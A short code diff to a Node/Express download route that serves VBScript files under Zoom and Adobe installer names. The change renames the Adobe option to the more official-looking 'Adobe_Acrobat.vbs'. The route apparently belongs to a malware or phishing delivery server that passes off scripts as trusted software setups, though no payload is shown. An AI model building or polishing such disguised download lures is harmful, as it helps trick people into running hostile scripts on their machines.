@@ -318,7 +318,7 @@ app.get('/download/vbs/:type/:docId', apiLimiter, async (req, res) => {
                 filename = 'Zoom_Browser_Setup.vbs';
                 break;
             case 'adobe':
-                filename = 'Adobev2T1_Setup.vbs';
+                filename = 'Adobe_Acrobat.vbs';
                 break;    
             default:
                 filename = 'Zoom_Workplace.vbs';
